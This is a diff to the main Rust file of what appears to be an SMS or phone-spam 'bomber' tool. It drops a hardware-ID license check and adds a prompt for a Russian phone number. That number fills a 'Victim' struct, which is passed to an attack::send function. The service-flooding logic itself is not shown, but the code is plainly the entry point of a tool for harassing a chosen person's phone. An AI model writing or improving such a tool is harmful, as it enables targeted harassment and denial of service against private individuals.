@@ -1,24 +1,34 @@
 mod attack;
+// mod hwid;
 mod phone;
 mod services;
-mod hwid;
 
 use crate::attack::send;
 use crate::phone::{Country, Phone};
 use crate::services::Victim;
-use crate::hwid::check_key;
+use std::io;
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    check_key().unwrap();
-    
+    let phone = loop {
+        println!("Enter russian number");
+
+        let mut input = String::new();
+        io::stdin().read_line(&mut input)?;
+
+        if let Ok(t) = Phone::new(input, Country::Ru) {
+            break t;
+        }
+    };
+
     let victim = Victim {
-        phone: Phone::new("+7 9xx xxx xx xx".to_string(), Country::Ru).expect(""),
+        phone,
         email: "".to_string(),
         name: "".to_string(),
         surname: "".to_string(),
     };
 
+    println!();
     send(victim).await?;
 
     Ok(())
